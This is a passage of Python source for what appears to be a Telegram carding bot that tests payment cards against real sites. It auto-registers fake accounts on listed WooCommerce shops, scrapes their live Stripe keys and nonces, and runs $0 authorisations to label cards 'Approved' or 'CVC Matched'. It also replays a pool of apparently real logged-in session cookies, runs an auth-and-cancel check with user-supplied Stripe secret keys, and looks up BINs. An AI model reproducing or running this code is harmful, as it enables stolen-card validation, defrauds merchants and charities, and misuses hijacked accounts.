        print(f"[DR] Final AJAX status={r4.status_code} len={len(txt)} preview={txt[:120]}")
    except Exception as e:
        print(f"[DR] Final AJAX exception: {str(e)[:80]}")
        return f"Error: Final post failed - {str(e)[:60]}"

    # ── Parse JSON response first (admin-ajax returns JSON for GiveWP) ─────────
    try:
        rj = r4.json()
        # Success responses
        status = rj.get('data', {}).get('status', '') if isinstance(rj.get('data'), dict) else ''
        if rj.get('success') and status in ('succeeded', 'processing', ''):
            return 'Approved'
        if rj.get('success'):
            return 'Approved'
        # Error inside JSON
        err_obj = rj.get('data', {})
        if isinstance(err_obj, dict):
            _code   = err_obj.get('code', '') or err_obj.get('decline_code', '')
            _msg    = err_obj.get('message', '')
        else:
            _code, _msg = '', str(err_obj)
        # requires_action / 3DS
        if (status == 'requires_action'
                or 'requires_action' in txt
                or 'authentication_required' in txt):
            return '3DS Required (Live Card)'
        if 'insufficient' in _msg.lower() or _code == 'insufficient_funds':
            return 'Insufficient Funds'
        if _code or _msg:
            return _parse_stripe_error({'code': _code, 'message': _msg,
                                        'decline_code': err_obj.get('decline_code', '') if isinstance(err_obj, dict) else ''})
    except Exception:
        pass

    # ── Fallback: HTML keyword scan ────────────────────────────────────────────
    tl = txt.lower()
    if any(x in txt for x in ('Thank you for your donation', 'thank you', 'succeeded',
                               'success":true', '"status":"succeeded"')):
        return 'Approved'
    if 'requires_action' in txt or 'authentication_required' in tl:
        return '3DS Required (Live Card)'
    if 'insufficient funds' in tl or 'insufficient_funds' in tl:
        return 'Insufficient Funds'
    if 'your card was declined' in tl:
        return 'Declined'
    if 'do_not_honor' in tl or 'do not honor' in tl:
        return 'Declined - Do Not Honor'
    if 'generic_decline' in tl:
        return 'Declined - Generic'
    if 'card_velocity_exceeded' in tl or 'velocity' in tl:
        return 'Declined - Velocity Exceeded'
    if 'incorrect_cvc' in tl or 'invalid_cvc' in tl:
        return 'Declined - Invalid CVC'
    if 'incorrect_number' in tl or 'invalid_number' in tl:
        return 'Declined - Invalid Number'
    if 'expired' in tl:
        return 'Declined - Expired Card'
    if 'stolen_card' in tl or 'lost_card' in tl:
        return 'Declined - Lost/Stolen'
    if 'pickup_card' in tl:
        return 'Declined - Pickup Card'
    if 'restricted_card' in tl:
        return 'Declined - Restricted'
    if 'blocked' in tl:
        return 'Declined - Blocked'
    if 'not_permitted' in tl:
        return 'Declined - Not Permitted'
    if 'security_violation' in tl:
        return 'Declined - Security Violation'
    return f"Declined - {txt.strip()[:60]}" if txt.strip() else 'Declined'


# ================== Stripe Auth Gateway ==================
# ── WooCommerce Stripe multi-site list ─────────────────────────────────────
# Add/remove sites here. Each must support free WC registration + Stripe plugin.
_WCS_SITES = [
    'https://mazaltovjudaica.com',
    'https://mchappyhour.com',
    'https://shopbunnyberry.com',
    'https://triversitycenter.org',
    'https://sponsoredadrenaline.com',
]

def _stripe_ajax_classify(r5):
    """Classify WooCommerce Stripe admin-ajax response → standard result string."""
    if not r5 or r5.strip() in ('0', '', 'null', 'false') or len(r5.strip()) <= 2:
        return "CCN"
    r5l = r5.lower()
    if 'your card was declined' in r5l or 'could not be set up for future usage' in r5l:
        return 'Declined'
    if 'success":true' in r5 and 'status":"succeeded' in r5:
        return 'Approved'
    if 'success' in r5l and 'requires_action' not in r5l:
        return 'Approved'
    if 'insufficient' in r5l or 'funds' in r5l:
        return 'Approved - Insufficient'
    if 'requires_action' in r5l or 'authentication_required' in r5l:
        return 'Approved OTP'
    if 'incorrect_number' in r5l:
        return 'Declined - Incorrect Number'
    if 'stolen_card' in r5l or 'lost_card' in r5l:
        return 'Declined - Lost/Stolen'
    if 'pickup_card' in r5l:
        return 'Declined - Pickup Card'
    if 'restricted_card' in r5l:
        return 'Declined - Restricted'
    if 'do_not_honor' in r5l or 'generic_decline' in r5l:
        return 'Declined - Do Not Honor'
    if 'incorrect_cvc' in r5l or 'cvc' in r5l:
        return 'CVC Error'
    if 'expired' in r5l:
        return 'Declined - Expired Card'
    if 'error' in r5l or 'invalid' in r5l or 'declined' in r5l:
        return 'Declined'
    snippet = r5.strip()[:60].replace('\n', ' ')
    return f"Unknown - {snippet}"


def _stripe_pm_classify(resp_json):
    """Classify Stripe /v1/payment_methods error → standard result string or None if OK.
    Returns 'GW_ERROR' for gateway/integration errors (caller should skip site).
    Returns None when PM was created successfully (id present).
    """
    if 'id' in resp_json:
        return None
    err          = resp_json.get('error', {})
    decline_code = err.get('decline_code', '')
    err_code     = err.get('code', '')
    err_type     = err.get('type', '')
    err_msg      = err.get('message', 'Unknown error')

    # ── Gateway/integration errors → caller skips to next site ───────────────
    _gw_kw = ('unsupported', 'integration surface', 'publishable key',
               'tokenization', 'dashboard', 'radar')
    if (err_type in ('api_connection_error', 'api_error', 'authentication_error',
                     'rate_limit_error', 'invalid_request_error')
            and not decline_code
            and any(kw in err_msg.lower() for kw in _gw_kw)):
        return 'GW_ERROR'

    # ── Card-level errors → definitive result ────────────────────────────────
    for code in (decline_code, err_code):
        if not code:
            continue
        if 'incorrect_number' in code or ('invalid' in code and 'number' in code):
            return "Declined - Invalid Card Number"
        if 'insufficient_funds' in code:
            return "Insufficient Funds"
        if 'expired' in code:
            return "Declined - Expired Card"
        if 'invalid_cvc' in code or 'incorrect_cvc' in code:
            return "Declined - Invalid CVC"
        if 'invalid_expiry' in code:
            return "Declined - Invalid Expiry"
        if 'card_declined' in code:
            return "Declined - Card Declined"
        return f"Declined - {code}"

    # ── Unknown error without decline code: check if gateway-level ───────────
    if not decline_code and any(kw in err_msg.lower() for kw in _gw_kw):
        return 'GW_ERROR'

    return f"Declined - {err_msg[:80]}"


def _wcs_try_site(c, mm, yy, cvc, site, uu, proxy_dict=None):
    """Run WooCommerce Stripe $0 auth on a single site. Returns result string."""
    host = site.replace('https://','').replace('http://','').split('/')[0]
    sess = requests.Session()
    if proxy_dict:
        sess.proxies.update(proxy_dict)
    hdrs = {'user-agent': uu, 'authority': host}
    try:
        r0 = sess.get(f'{site}/my-account/add-payment-method/', headers=hdrs, timeout=12)
        ft_m = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', r0.text)
        if not ft_m:
            return None  # site doesn't expose registration nonce → skip
        ft = ft_m.group(1)

        email = f"usr{random.randint(10000,99999)}@gmail.com"
        pw    = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=12)) + '!A'
        reg_data = {
            'email': email, 'password': pw,
            'woocommerce-register-nonce': ft,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'register': 'Register',
        }
        sess.post(f'{site}/my-account/add-payment-method/', headers=hdrs, data=reg_data, timeout=12)
        r1 = sess.get(f'{site}/my-account/add-payment-method/', headers=hdrs, timeout=12)

        pkk_m = re.search(r'(pk_live_[a-zA-Z0-9]+)', r1.text)
        nonce_m = re.search(r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"', r1.text)
        if not pkk_m or not nonce_m:
            return None
        pkk = pkk_m.group(1)
        VaG = nonce_m.group(1)

        stripe_data = (
            f'type=card&card[number]={c}&card[cvc]={cvc}'
            f'&card[exp_year]={yy}&card[exp_month]={mm}'
            f'&allow_redisplay=unspecified'
            f'&billing_details[address][postal_code]=10090'
            f'&billing_details[address][country]=US'
            f'&payment_user_agent=stripe.js%2Ffd4fde14f8%3B+stripe-js-v3%2Ffd4fde14f8%3B+payment-element%3B+deferred-intent'
            f'&key={pkk}'
        )
        sr = sess.post('https://api.stripe.com/v1/payment_methods',
                       headers={'authority': 'api.stripe.com', 'user-agent': uu},
                       data=stripe_data, timeout=15)
        sr_json = sr.json()
        classified = _stripe_pm_classify(sr_json)
        if classified == 'GW_ERROR':
            return None   # gateway restriction → skip, try next site
        if classified:
            return classified  # card-level error → definitive
        idf = sr_json['id']

        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': idf,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': VaG,
        }
        ajax_hdrs = {**hdrs, 'x-requested-with': 'XMLHttpRequest', 'authority': host}
        try:
            r5 = sess.post(f'{site}/wp-admin/admin-ajax.php', headers=ajax_hdrs, data=ajax_data, timeout=15).text
        except Exception:
            r5 = ""
        return _stripe_ajax_classify(r5)
    except Exception:
        return None


def stripe_auth_ex(ccx, proxy_dict=None):
    """Returns (result_str, gateway_label) tuple."""
    parsed = _parse_card(ccx)
    if not parsed:
        return "𝗘𝗿𝗿𝗼𝗿: Invalid card format", "N/A"
    c, mm, yy, cvc = parsed

    uu = generate_user_agent()
    last_result = "CCN"
    last_label  = _WCS_SITES[0].replace('https://','').replace('http://','').split('/')[0] if _WCS_SITES else 'WC-Stripe'

    for site in _WCS_SITES:
        label  = site.replace('https://','').replace('http://','').split('/')[0]
        result = _wcs_try_site(c, mm, yy, cvc, site, uu, proxy_dict)
        if result is None:
            continue
        last_result = result
        last_label  = label
        if result != "CCN":
            return result, label
    return last_result, last_label


def stripe_auth(ccx, proxy_dict=None):
    result, _ = stripe_auth_ex(ccx, proxy_dict)
    return result

def stripe_auth_single(ccx, proxy_dict=None):
    """Uses only the primary (best) WCS site — faster, no multi-site false positives."""
    parsed = _parse_card(ccx)
    if not parsed:
        return "𝗘𝗿𝗿𝗼𝗿: Invalid card format", "N/A"
    c, mm, yy, cvc = parsed
    uu = generate_user_agent()
    if not _WCS_SITES:
        return "No gateway configured", "N/A"
    site = _WCS_SITES[0]
    label = site.replace('https://','').replace('http://','').split('/')[0]
    result = _wcs_try_site(c, mm, yy, cvc, site, uu, proxy_dict)
    if result is None:
        result = "CCN"
    return result, label

# ===============================================================
# SK KEY MANAGEMENT HELPERS
# ===============================================================

def get_user_sk(user_id):
    """Return decrypted SK key for the user, or None. Thread-safe."""
    try:
        data = _load_data()
        stored = data.get(str(user_id), {}).get('sk_key', None)
        if stored is None:
            return None
        # Decrypt if encrypted; returns plaintext or None on error
        decrypted = _dec_sk(stored)
        return decrypted
    except Exception:
        return None

def set_user_sk(user_id, sk_key):
    """Encrypt and save user's SK key. Thread-safe via _DATA_LOCK."""
    try:
        # Validate format before touching disk
        if not isinstance(sk_key, str) or not (
            sk_key.startswith('sk_live_') or sk_key.startswith('sk_test_')
        ):
            return False
        encrypted = _enc_sk(sk_key)
        data = _load_data()
        uid = str(user_id)
        if uid not in data:
            data[uid] = {"plan": "𝗙𝗥𝗘𝗘", "timer": "none"}
        data[uid]['sk_key'] = encrypted
        return _save_data(data)
    except Exception:
        return False

def delete_user_sk(user_id):
    """Delete user's SK key. Uses _DATA_LOCK for thread safety."""
    try:
        data = _load_data()
        uid = str(user_id)
        if uid in data and 'sk_key' in data[uid]:
            del data[uid]['sk_key']
            _save_data(data)
        return True
    except Exception:
        return False

def stripe_sk_check(ccx, sk_key, proxy_dict=None):
    ccx = ccx.strip()
    parts = re.split(r'[ |/]', ccx)
    if len(parts) < 4:
        return "Invalid card format — use CC|MM|YY|CVV"
    c   = parts[0]
    mm  = parts[1]
    ex  = parts[2]
    cvc = parts[3].strip()

    if len(ex) == 4:
        yy = ex[2:]
    else:
        yy = ex.zfill(2)

    fake = Faker()
    first_name = fake.first_name()
    last_name = fake.last_name()
    email = f"{first_name.lower()}{random.randint(1000,9999)}@gmail.com"
    zip_code = fake.zipcode()

    sess = requests.Session()
    if proxy_dict:
        sess.proxies.update(proxy_dict)

    ua = generate_user_agent()
    auth_headers = {
        'Authorization': f'Bearer {sk_key}',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': ua,
    }

    # Step 1: Create payment method using SK key directly
    pm_data = (
        f'type=card'
        f'&billing_details[name]={first_name}+{last_name}'
        f'&billing_details[email]={email}'
        f'&billing_details[address][postal_code]={zip_code}'
        f'&billing_details[address][country]=US'
        f'&card[number]={c}'
        f'&card[cvc]={cvc}'
        f'&card[exp_month]={mm}'
        f'&card[exp_year]={yy}'
    )
    try:
        pm_resp = sess.post('https://api.stripe.com/v1/payment_methods', headers=auth_headers, data=pm_data, timeout=20)
        pm_json = pm_resp.json()
    except Exception as e:
        return f"Error: {str(e)[:50]}"

    if 'error' in pm_json:
        return _parse_stripe_error(pm_json['error'])

    pm_id = pm_json.get('id')
    if not pm_id:
        return "Declined - Could not tokenize card"

    # Step 2: Create + confirm Payment Intent (auth only, capture_method=manual)
    pi_data = (
        f'amount=100'
        f'&currency=usd'
        f'&payment_method={pm_id}'
        f'&confirm=true'
        f'&capture_method=manual'
        f'&description=SK+Auth+Check'
        f'&return_url=https%3A%2F%2Fhackersparadise.com%2Freturn'
    )
    try:
        pi_resp = sess.post('https://api.stripe.com/v1/payment_intents', headers=auth_headers, data=pi_data, timeout=20)
        pi_json = pi_resp.json()
    except Exception as e:
        return f"Error: {str(e)[:50]}"

    if 'error' in pi_json:
        return _parse_stripe_error(pi_json['error'])

    status = pi_json.get('status', '')
    if status == 'requires_capture':
        # Cancel the uncaptured auth immediately to avoid actual charge
        try:
            sess.post(f'https://api.stripe.com/v1/payment_intents/{pi_json["id"]}/cancel', headers=auth_headers, timeout=10)
        except Exception:
            pass
        return "Approved ✅ Auth"
    elif status == 'requires_action' or pi_json.get('next_action'):
        return "3DS Required (Live Card)"
    elif status == 'succeeded':
        amount_val = pi_json.get('amount', 100)
        currency_val = pi_json.get('currency', 'usd').upper()
        try:
            sess.post(f'https://api.stripe.com/v1/payment_intents/{pi_json["id"]}/cancel', headers=auth_headers, timeout=10)
        except Exception:
            pass
        return f"Charged {currency_val} {int(amount_val)/100:.2f}"
    elif status == 'requires_payment_method':
        pi_err = pi_json.get('last_payment_error', {})
        if pi_err:
            return _parse_stripe_error(pi_err)
        return "Card Declined"
    else:
        return f"Declined - {status}" if status else "Card Declined"

# ================== DLX Stripe Engine (checker.py port) ==================
# Gate: associationsmanagement.com — WooCommerce SetupIntent auth
# No external charge — confirms card via Stripe's createAndConfirmSetupIntent
_DLX_ACCOUNT_POOL = [
    {
        'name': 'Xray Xlea',
        'cookies': {
            '_ga': 'GA1.2.493930677.1768140612',
            '__stripe_mid': '66285028-f520-443b-9655-daf7134b8b855e5f16',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'xrayxlea%7C1769350388%7CxGcUPPOJgEHPSWiTK6F9YZpA6v4AgHki1B2Hxp0Zah5%7C3b8f3e6911e25ea6cccc48a4a0be35ed25e0479c9e90ccd2f16aa41cac04277d',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '7670%7Cother%7Cread%7Cb723e85c048d2147e793e6640d861ae4f4fddd513abc1315f99355cf7d2bc455',
            '__cf_bm': 'rd1MFUeDPNtBzTZMChisPSRIJpZKLlo5dgif0o.e_Xw-1769258154-1.0.1.1-zhaKFI8L0JrFcuTzj.N9OkQvBuz6HvNmFFKCSqfn_gE2EF3GD65KuZoLGPuEhRyVwkKakMr_mcjUehEY1mO9Kb9PKq1x5XN41eXwXQavNyk',
            '__stripe_sid': '4f84200c-3b60-4204-bbe8-adc3286adebca426c8',
        }
    },
    {
        'name': 'Yasin Akbulut',
        'cookies': {
            '__cf_bm': 'zMehglRiFuX3lzj170gpYo3waDHipSMK0DXxfB63wlk-1769340288-1.0.1.1-ppt5LELQNDnJzFl1hN13LWwuQx5ZFdMS9b0SP4A3j7kasxaqEBMgSJ3vu9AbzyFOlbCozpAr.hE.g3xFpU_juaLp1heupyxmSrmte1Gn7g0',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'akbulutyasin836%7C1770549977%7CwdF5vz1qFXPSxofozNx9OwxFdmIoSdQKxaHlkOkjL2o%7C4d5f40c1bf01e0ccd6a59fdf08eb8f5aeb609c05d4d19fe41419a82433ffc1fa',
            '__stripe_mid': '2d2e501a-542d-4635-98ec-e9b2ebe26b4c9ac02a',
            '__stripe_sid': 'b2c6855b-7d29-4675-8fe4-b5c4797045132b8dea',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8214%7Cother%7Cread%7Cde5fd05c6afc735d5df323de21ff23f598bb5e1893cb9a7de451b7a8d50dc782',
        }
    },
    {
        'name': 'Ahmet Aksoy',
        'cookies': {
            '__cf_bm': 'aidh4Te7pipYMK.tLzhoGhXGelOgYCnYQJ525DEIqNM-1769341631-1.0.1.1-HSRHKAbOct2k1bbWIIdIN7b5fzWFydAtRqz2W0pAdRXrbVusNthJCJvU5fc7d3RkZEOZ5ZXZghJ4J2jmYzIcdJGDbb90txn4HPgSKJ6neA8',
            '_ga': 'GA1.2.1596026899.1769341671',
            '__stripe_mid': '1b0100cd-503c-4665-b43b-3f5eb8b4edcdaae8bd',
            '__stripe_sid': '0f1ce17f-f7a9-4d26-bd37-52d402d30d1a8716bf',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'ahmetaksoy2345%7C1770551236%7CGF3svY4oh1UiTMXJ9iUXXuXtimHSG6PHiW0Sm5wrDbt%7Ce810ede4e1743cd73dc8dacdd56598ecf4ceaa383052d9b50d1bbd6c02da7237',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8216%7Cother%7Cread%7C70f37e1a77141c049acd75715a8d1aef6d47b285656c907c79392a55e787d97e',
        }
    },
    {
        'name': 'Dlallah',
        'cookies': {
            '__cf_bm': 'nwW.aCdcJXW8SAKZYpmEuqU6gCsNM1ibgP9mNKqXuYw-1769341811-1.0.1.1-hkeF4QihuQfbJD7DRqQcILcMycgxTqxxHcqwsU6oR8WsdViGcVMbX0CHqmx76N8wUEuIQwLFooNTm2gjGrRCKlURh4vf1ghD3gkz18KjyWg',
            '__stripe_mid': 'c7368749-b4fc-4876-bb97-bc07cc8a36b5851848',
            '__stripe_sid': 'b9d4dfb2-bba4-4ee6-9c72-8acf6acfe138efd65d',
            '_ga': 'GA1.2.1162515809.1769341851',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'dlallah%7C1770551422%7CiMfIpOcXTEo2Y9rmVMf3Mpf0kpkC4An81IgT0ZfMLff%7C01fbc5549954aa84d4f1b6c62bc44ebe65df58be0b82014d1b246c220d361231',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8217%7Cother%7Cread%7C24531823e5d32b0ad918bef860997fced3f0b92cce7ba200e3a753e050b546d3',
        }
    },
    {
        'name': 'Deluxe Allhnsen',
        'cookies': {
            '__cf_bm': 'iYJ5LSJEvFExskGebf3t21mmLqKNYcNuBh_h5XpEu_M-1771777975-1.0.1.1-9swUGlaAtyk.QI6nfE6R5pE5njAnki6n.0Z_AqvUvF_Ca1n2hflE2Se_LcR2xxyGPiMSk6sWsjR7FyCCcCB6zB_GW9RxHxcV2uO49zv.1v4',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'deluxeallhnsen%7C1772987595%7CHARvqv145XTk50Ugi9eXcaQfbQJWucqdQhyBBAh2Can%7C66ff358ab87a601ae763d81e0c18aeea9938f3fdf702e19fed938ca561fc5747',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '10129%7Cother%7Cread%7C408accc7d1475dea1b11a496c4d0ce756b822a1637428b65bd82c5e3349a7cfa',
            '__stripe_mid': '39afb715-473b-4edc-82e7-893199f684a5fecb41',
            '__stripe_sid': 'e0ada70c-b2e9-4811-b90a-7b6890b7392018682f',
        }
    },
    {
        'name': 'Deluxe Hereaxj',
        'cookies': {
            '__cf_bm': 'A2wk0Fbmoi2EAgp02OjWf49jJmsNsUFHjveEIhoK2Us-1771777859-1.0.1.1-omGp875SnjvwdPYcC1N_NShTjcTopWnttxEvpM8tLugghF4.MdmtB775nDj1nS1_xly_l.9nwc.oNzOYduZosDrtdbr5COTEQ3tTIqFrySQ',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'deluxehereaxj%7C1772987473%7C04Zd14OFEzftOw05DN6npfFKCf6tsTLQKOvS6ylB8l5%7Cd017f480dbb4b9ffd536a15e943592ec0c4743b338edbf7540b7a947bac24b43',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '10128%7Cother%7Cread%7C5c9d91c1dde21e721405c776ba598c2614d986b67c559dbf5be71b086a7131e7',
            '__stripe_mid': 'fdb48950-38b8-4c32-9c2a-3a886220f37790d822',
            '__stripe_sid': '4c4a6b2b-b905-4087-a824-9fd92b8186360ed462',
        }
    },
]

_DLX_SITE   = 'https://associationsmanagement.com'
_DLX_PAGE   = _DLX_SITE + '/my-account/add-payment-method/'
_DLX_AJAX   = _DLX_SITE + '/wp-admin/admin-ajax.php'
_DLX_UA     = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
_DLX_HDRS   = {
    'authority': 'associationsmanagement.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.9',
    'user-agent': _DLX_UA,
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

def dlx_stripe_engine(ccx, proxy_dict=None):
    """
    Ported from Dlx/checker.py — stripe_engine().
    Gate: associationsmanagement.com (WooCommerce)
    Flow: login cookie → pk_live + nonce → Stripe PM → WC Ajax confirm
    Returns plain-text result string (no ANSI codes).
    """
    import uuid as _uuid
    import cloudscraper as _cs

    ccx = ccx.strip()
    parsed = _parse_card(ccx)
    if not parsed:
        return 'Error: Invalid card format (need cc|mm|yy|cvv)'
    n, mm, yy, cvc = parsed
    # Normalise year to 4 digits
    yy = f'20{yy[-2:]}' if len(yy) <= 2 else yy

    acc = random.choice(_DLX_ACCOUNT_POOL)

    try:
        scraper = _cs.create_scraper(
            browser={'browser': 'chrome', 'platform': 'android', 'mobile': True}
        )
        if proxy_dict:
            scraper.proxies.update(proxy_dict)
        scraper.cookies.update(acc['cookies'])
        scraper.headers.update(_DLX_HDRS)

        # Step 1 — load payment method page, extract pk_live + nonce
        r_page = scraper.get(_DLX_PAGE, timeout=25)
        pk_m   = re.search(r'pk_live_[a-zA-Z0-9]+', r_page.text)
        non_m  = re.search(r'"createAndConfirmSetupIntentNonce":"([a-z0-9]+)"', r_page.text)
        if not pk_m or not non_m:
            return 'Error: Could not extract Stripe keys from gate page'
        pk_live  = pk_m.group(0)
        addnonce = non_m.group(1)

        time.sleep(random.uniform(1.5, 2.5))

        # Step 2 — tokenise card at Stripe
        stripe_hd = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': _DLX_UA,
        }
        stripe_payload = (
            f'type=card&card[number]={n}&card[cvc]={cvc}'
            f'&card[exp_year]={yy}&card[exp_month]={mm}'
            f'&billing_details[name]={acc["name"].replace(" ", "+")}'
            f'&billing_details[address][postal_code]=10001'
            f'&key={pk_live}'
            f'&muid={acc["cookies"].get("__stripe_mid", str(_uuid.uuid4()))}'
            f'&sid={acc["cookies"].get("__stripe_sid", str(_uuid.uuid4()))}'
            f'&guid={str(_uuid.uuid4())}'
            f'&payment_user_agent=stripe.js%2F8f77e26090%3B+stripe-js-v3%2F8f77e26090%3B+checkout'
            f'&time_on_page={random.randint(90000, 150000)}'
        )
        r_stripe = scraper.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_hd, data=stripe_payload, timeout=20
        ).json()

        if 'id' not in r_stripe:
            err = r_stripe.get('error', {}).get('message', 'Radar Security Block')
            return f'Declined → {err}'

        pm_id = r_stripe['id']

        # Step 3 — confirm via WooCommerce Ajax SetupIntent
        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': addnonce,
        }
        r_ajax = scraper.post(_DLX_AJAX, data=ajax_data, timeout=20).text

        rl = r_ajax.lower()
        if '"success":true' in rl or 'insufficient_funds' in rl:
            return 'Approved ✅'
        if 'incorrect_cvc' in rl:
            return 'CVC Matched ✅'
        reason_m = re.search(r'message\\":\\"(.*?)\\"', r_ajax)
        reason   = reason_m.group(1) if reason_m else 'Rejected'
        return f'Declined → {reason}'

    except Exception as e:
        return f'Error: {str(e)[:60]}'

# ===============================================================

# Function to get BIN information
def _bin_lookup_all(bin6: str) -> dict:
    """
    Try 5 BIN APIs in parallel using ThreadPoolExecutor (replaces serial calls).
    Returns a unified dict: brand, card_type, level, bank, country, country_code.
    Parallel execution cuts worst-case latency from ~35s to ~7s.
    """
    import concurrent.futures
    ua = str(generate_user_agent())
    _FALLBACK = dict(brand="Unknown", card_type="", level="",
                     bank="Unknown", country="Unknown", country_code="N/A")

    def _api1():
        try:
            r = requests.get(
                f"https://lookup.binlist.net/{bin6}",
                headers={"Accept-Version": "3", "User-Agent": ua}, timeout=7)
            if r.status_code == 200:
                d = r.json()
                if isinstance(d, dict):
                    scheme = (d.get("scheme") or "").title()
                    brand  = d.get("brand") or scheme or ""
                    if brand and brand != "Unknown":
                        return dict(
                            brand=brand,
                            card_type=(d.get("type") or "").capitalize(),
                            level=("Prepaid" if d.get("prepaid") else ""),
                            bank=(d.get("bank") or {}).get("name") or "Unknown",
                            country=(d.get("country") or {}).get("name") or "Unknown",
                            country_code=(d.get("country") or {}).get("alpha2") or "N/A",
                        )
        except Exception:
            pass
        return None

    def _api2():
        try:
            r = requests.get(
                f"https://bins.antipublic.cc/bins/{bin6}",
                headers={"User-Agent": ua}, timeout=7)
            if r.status_code == 200:
                d = r.json()
                if isinstance(d, dict):
                    brand = (d.get("brand") or "").title()
                    if brand and brand != "Unknown":
                        return dict(
                            brand=brand,
                            card_type=(d.get("type") or "").title(),
                            level=(d.get("level") or "").title(),
                            bank=d.get("bank") or "Unknown",
                            country=(d.get("country_name") or "").title() or "Unknown",
                            country_code=d.get("country") or "N/A",
                        )
        except Exception:
            pass
        return None

    def _api3():
        try:
            r = requests.get(
                f"https://binsapi.vercel.app/api/bin?bin={bin6}",
                headers={"User-Agent": ua}, timeout=7)
            if r.status_code == 200:
                d = r.json()
                if isinstance(d, dict):
                    brand = (d.get("scheme") or d.get("brand") or "").upper()
                    if brand and brand not in ("", "UNKNOWN"):
                        country_obj = d.get("country") or {}
                        bank_obj    = d.get("bank") or {}
                        return dict(
                            brand=brand,
                            card_type=(d.get("type") or "").capitalize(),
                            level="",
                            bank=(bank_obj.get("name") if isinstance(bank_obj, dict) else str(bank_obj)) or "Unknown",
                            country=(country_obj.get("name") if isinstance(country_obj, dict) else str(country_obj)) or "Unknown",
                            country_code=(country_obj.get("alpha2") if isinstance(country_obj, dict) else "") or "N/A",
                        )
        except Exception:
            pass
        return None

    def _api4():
        try:
            r = requests.get(
                f"https://data.handyapi.com/bin/{bin6}",
                headers={"User-Agent": ua}, timeout=7)
            if r.status_code == 200:
                d = r.json()
                if isinstance(d, dict) and d.get("Status") == "SUCCESS":
                    brand = (d.get("Scheme") or "").title()
                    if brand and brand != "Unknown":
                        c_obj = d.get("Country") or {}
                        b_obj = d.get("Issuer") or {}
                        return dict(
                            brand=brand,
                            card_type=(d.get("Type") or "").capitalize(),
                            level=(d.get("CardTier") or "").capitalize(),
                            bank=(b_obj.get("Name") if isinstance(b_obj, dict) else "Unknown") or "Unknown",
                            country=(c_obj.get("Name") if isinstance(c_obj, dict) else "Unknown") or "Unknown",
                            country_code=(c_obj.get("A2") if isinstance(c_obj, dict) else "N/A") or "N/A",
                        )
        except Exception:
            pass
        return None

    def _api5():
        try:
            r = requests.post(
                "https://transfunnel.io/projects/chargeback/bin_check.php",
                data=f'{{"bin_number":"{bin6}"}}',
                headers={"User-Agent": ua}, timeout=7)
            raw  = r.json()
            info = raw.get("results") if isinstance(raw, dict) else None
            if isinstance(info, dict) and info:
                return dict(
                    brand=info.get("cardBrand") or "Unknown",
                    card_type=info.get("cardType") or "",
                    level=info.get("cardCat") or "",
                    bank=info.get("issuingBank") or "Unknown",
                    country=info.get("countryName") or "Unknown",
                    country_code=info.get("countryA2") or "N/A",
                )
        except Exception:
            pass
        return None

    # Run all 5 APIs concurrently — worst-case ~7s instead of ~35s
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
        futs = [ex.submit(fn) for fn in (_api1, _api2, _api3, _api4, _api5)]
        for fut in concurrent.futures.as_completed(futs, timeout=8):
            try:
                result = fut.result()
                if result:
                    # Cancel remaining (best-effort, futures may already be running)
                    for f in futs:
                        f.cancel()
                    return result
            except Exception:
                pass

    return _FALLBACK


def get_bin_info(bin):
    bin6 = str(bin)[:6]
    d = _bin_lookup_all(bin6)
    brand        = d["brand"]
    card_type    = d["card_type"]
    level        = d["level"]
    bank         = d["bank"]
    country      = d["country"]
    country_code = d["country_code"]
    parts = [p for p in [brand, card_type, level] if p]
    bin_info = " - ".join(parts) if parts else "Unknown"
    return bin_info, bank, country, country_code

# ================== دوال المساعدة للتشخيص ==================

@bot.message_handler(commands=["myid"])
def show_my_id(message):
    """معرفة ID المستخدم"""
    user_id = message.from_user.id
    bot.reply_to(message, f"<b>معرفك هو: <code>{user_id}</code></b>")

@bot.message_handler(commands=["ppdbg"])
def ppdbg_command(message):
    if message.from_user.id != admin:
        return
    def run():
        import traceback
        out = []
        site_url = 'https://www.rarediseasesinternational.org'
        full_donate = site_url + '/donate/'
        ajax_url = site_url + '/wp-admin/admin-ajax.php'
        ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
        n, mm2, yy, cvc = '4111111111111111', '12', '26', '123'
        amount = '1.00'
        fn, ln, email = 'John', 'Smith', 'john123@gmail.com'
        try:
            sess = requests.Session()
